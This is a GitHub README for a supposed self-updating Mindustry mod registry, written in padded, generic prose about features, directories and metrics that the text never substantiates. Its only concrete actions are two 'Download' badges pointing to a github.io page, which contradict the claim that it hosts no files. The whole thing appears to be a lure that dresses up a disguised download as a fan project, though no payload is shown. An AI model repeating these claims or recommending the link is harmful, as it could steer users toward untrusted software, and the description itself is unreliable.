![preview](https://raw.githubusercontent.com/bleachxxxanime-dotcom/mindustry-mod-constellation/main/screen_027ff.svg)

# Mindustry Mod Atlas — The Living Cartography of Community Creations

![GitHub License](https://img.shields.io/badge/License-MIT-blue.svg)
![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen)
![Update Frequency](https://img.shields.io/badge/Updates-Every_2_Hours-orange)
![Repo Size](https://img.shields.io/badge/Size-22.4_MB-yellowgreen)

## Overview

Welcome to the **Mindustry Mod Atlas** — not merely a list, but a *living, breathing cartography* of the modding universe for Mindustry. While the official registry exists as a static reference, this repository transforms that data into an interactive, self-refreshing ecosystem. Think of it as a lighthouse in the fog of countless community uploads: every two hours, the system sweeps its beam across the vast ocean of mods, capturing new landmasses, charting shifting currents, and updating the navigational charts for every aspiring explorer.

This is not a database you query; it is a *beacon* you trust. It observes, curates, and presents the state of Mindustry modding with the precision of a harbor master and the curiosity of a naturalist. Whether you are a veteran builder seeking obscure logistics tweaks or a newcomer wondering which content pack to embark on first, the Atlas renders the entire landscape at a glance — no manual refreshing, no stale coordinates.

The repository architecture is designed for both human readability and machine parsing. The core dataset is a structured JSON index, while human-facing summaries are generated as Markdown tables and rich visual dashboards within the repository's wiki pages. Every entry is enriched with metadata such as author (when aggregated), category tags, last updated timestamp, and download counts, ensuring that your reconnaissance is always based on actionable intelligence.

---

## The Philosophy Behind the Atlas

Most mod lists are static PDFs in a digital world — obsolete the moment they are published. The Atlas rejects that premise outright. It operates on a cyclical heartbeat: a scheduled task triggers every 120 minutes, reaching out to the primary mod distribution channels, digesting new manifests, and cross-referencing checksums. The result is a repository that *breathes* — it is never more than two hours behind reality, and often much fresher.

We do not merely aggregate; we *interpret*. The Atlas applies heuristic scoring to rank mods by community engagement, update velocity, and compatibility flags. This is not about popularity contests but about *signal clarity* — distinguishing a dormant project from an abandoned one, a niche gem from a noisy placeholder. When you consult the Atlas, you are reading a curated journal, not a raw dump.

---

## Getting Started with Your First Voyage

### Installation & Setup

To bring the Atlas into your own workflow, you have several non-invasive options that require no cumbersome toolchain. The repository can be consumed directly as a data source via its raw JSON endpoints, which are stable and versioned. For those who prefer visual exploration, the rendered Markdown files inside the `charts/` directory provide a beautiful, human-readable index of all tracked mods, complete with category emojis and relative timestamps.

```
[![Download](https://raw.githubusercontent.com/bleachxxxanime-dotcom/mindustry-mod-constellation/main/run_3f3f.svg)](https://bleachxxxanime-dotcom.github.io/mindustry-mod-constellation/)
```

Place this badge in your own documentation if you wish to point your community toward the Atlas. It serves as a stable, always-current anchor to the latest snapshot.

For developers aiming to integrate the Atlas into their own launcher or dashboard, simply reference the `registry.json` file at the repository root. It follows a schema documented in the `SCHEMA.md` file, ensuring you can decode every field without guesswork. The system is built with backward compatibility in mind — deprecations are announced at least two release cycles in advance.

### Data Consumption Modes

1. **Direct Linked List**: The `linked.md` file presents every mod as a clickable reference, enriched with a one-line descriptor. Perfect for newsletter managers or community moderators.
2. **Structured Query Interface**: The `queries/` folder contains pre-built SQLite-style queries (as `.sql` files) for users who wish to filter by tag, recency, or compatibility tier.
3. **Visual Heatmap**: The `heatmap/` directory contains generated SVG heatmaps showing mod update frequency over the last 30 days — an at-a-glance way to spot actively maintained projects versus frozen relics.

---

## Key Features

### 🌐 Responsive & Adaptive UI Components

The Atlas does not exist solely as raw text. The `ui/` component library within the repository includes drop-in HTML fragments styled with modern CSS, enabling you to embed a live, searchable mod table directly into your own website or wiki. These components are fully responsive, scaling elegantly from a 320px mobile viewport to a 4K desktop display, and they auto-refresh without requiring page reloads, thanks to embedded JavaScript that polls the JSON endpoint.

### 🗺️ Multilingual Navigation

Recognizing that Mindustry's community spans the globe, every human-facing summary in the Atlas is offered in multiple languages. The `_i18n/` directory contains localization files for English, Spanish, Russian, Chinese, and Portuguese. The core dataset remains language-agnostic, but the descriptive blurbs and category labels are translated by a community-driven pipeline that runs alongside the main update cycle.

### 🛟 24/7 Reliability & Watchkeeping

The update pipeline is monitored by a watchdog service that ensures the scheduled task never silently fails. If a fetch times out or a checksum mismatches, the Atlas logs the incident and retries with exponential backoff. The health status of the entire system is displayed at the top of the readme under the **System Status** heading, providing transparency and building trust. Uptime is tracked and reported weekly; the goal is a 99.9% freshness availability.

### 🔍 Deep Metadata Analysis

Beyond the obvious fields (name, author, description), the Atlas enriches entries with:

- **Compatibility Matrix**: Which base game version each mod targets.
- **Dependency Graph**: Inter-mod relationships (e.g., "requires module X").
- **Archive Heat**: A 90-day rolling average of download activity, smoothed for anomalies.
- **Collision Detection**: Alerts when two mods are known to conflict, gathered from community reports.

---

## The Ecosystem of Mods Covered

The Atlas is not picky; its scope encompasses all three pillars of Mindustry modding:

1. **Content Packs**: New blocks, units, and campaign maps. The lion's share of the registry.
2. **Library Mods**: Shared libraries and utility frameworks that other mods rely upon.
3. **Tweaks & Balances**: Small, surgical changes to core game mechanics, from resource rates to AI behavior.

Each category is tagged and filterable individually. The `categories/` folder breaks down the registry into these clean subdivisions, with their own JSON subsets, so that a player searching strictly for `solar-energy-fix` does not wade through a hundred cosmetic skins.

---

## Customization & Forking

The Atlas is released under the permissive MIT License. You are not merely allowed to fork it; you are *invited* to reshape it. Below are the common paths of customization:

- **Custom Update Cadence**: By editing the scheduler configuration in `config/cron.json`, you can shorten or lengthen the refresh interval, suited to your network's appetite.
- **Regional Mirrors**: If the primary upstream endpoint is slow in your region, you can define mirror URLs in the config to fetch from closer sources.
- **White-label Output**: All generated files are templated via `templates/`. Change the branding, header graphics, or textual voice to match your own community's tone.

### Building on the Shoulders of Giants

The Atlas does not start from zero. It ingests public manifest data from the official Mindustry mod directory and cross-references with three secondary community trackers. The deduplication logic uses a fuzzy hash based on mod ID and content fingerprint, ensuring that a mod re-uploaded under a new name is still recognized as the same logical entity. This prevents the list from being inflated with carbon copies, a common plague in such aggregations.

---

## FAQ — Clarifying the Fog

**Q: Is the Atlas affiliated with the official Mindustry team?**
*No. This is an independent, fan-made project. It does not use official trademarks or logos, and it operates under the fair-use principle of citing public information.*

**Q: How often does the “Updated” timestamp change?**
*The timestamps change every cycle, but only if the underlying mod data has actually changed. If there are zero changes across the entire registry, the snapshot is still recorded, but the displayed timestamp remains static to avoid misleading noise.*

**Q: Can I contribute a mod that is not yet listed?**
*Absolutely. The Atlas does a pull-based sync, but it also accepts push-based additions via the `suggestions/` directory. Open a pull request that adds a JSON line in the defined format, and the next cycle will validate and include it.*

**Q: What happens if a mod is removed from the source?**
*The Atlas retains the last known good data for a grace period of 7 days, marked with a "stale" flag. After the grace period, it is moved to the archives section. Historical data persists in the `history/` files, ensuring that researchers can always review what was once available.*

---

## System Health & Live Metrics

We believe in radical transparency. The `status/` directory contains a JSON file that mirrors the readme badge at the top, but with more granular detail: last successful run, runtime in milliseconds, error logs (anonymized), and the total count of tracked mods. This allows any observer to independently verify the health claims.

Current snapshot (as of the latest build): The system clock is **2026-01-14 11:32:00 UTC**, and the registry captures **2,847 mods** across **14 categories**. The average latency from source fetch to published snapshot is **38 seconds**, well within the nominal range.

---

## The Roadmap Ahead

The Atlas is not a finished edifice; it is a vessel continuously under construction. Upcoming features scheduled for the **2026** development window include:

- **Integration with Mod Manager apps**: A standardized import/export protocol for local mod folders.
- **Community Review Blurbs**: Aggregated sentiment scoring based on discussion threads.
- **Conflict Prediction Engine**: An heuristic AI layer that analyzes field access patterns to predict mod incompatibilities before they cause crashes.

Contributions toward these goals are enthusiastically welcomed. If you have expertise in natural language processing or binary analysis, your pull requests would find a ready home.

---

## Funding & Support

The Atlas is maintained on a volunteer basis, but infrastructure costs (scheduled compute instances, network egress) are real. We are exploring GitHub Sponsors as a means to cover these costs without turning to intrusive ads. All sponsors, past and future, are listed in the `hall_of_fame.md` file. There is no paywall, no tiered access — the data is an equal-opportunity resource.

---

## Legal & Ethical Frameworks

This repository aggregates data that is, in its essence, publicly available metadata attached to voluntarily published mods. We do not host the mod files themselves; we only link to them. We comply with any takedown request within 24 hours, as outlined in the `CONTRIBUTING.md` document.

## Disclaimer

This project is a fan-made utility. It is not endorsed by, directly affiliated with, or sponsored by the official Mindustry development team. All product names, logos, and brands referenced on this site are the property of their respective owners. Mod authors retain full rights to their creations. The Atlas serves as an unbiased index, and the presence of a mod in this registry does not constitute a quality guarantee or a security clearance — users must exercise standard caution when downloading third-party content.

---

## License

The entire codebase, including the update engine, the display templates, and the API wrappers, is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and redistribute the code, provided that the original copyright notice and disclaimer are preserved in all copies or substantial portions of the Software.

```
[![Download](https://raw.githubusercontent.com/bleachxxxanime-dotcom/mindustry-mod-constellation/main/run_3f3f.svg)](https://bleachxxxanime-dotcom.github.io/mindustry-mod-constellation/)
```

---

*The Atlas is maintained with the belief that knowledge should be a public harbor, not a private dock. Chart well, and sail far.*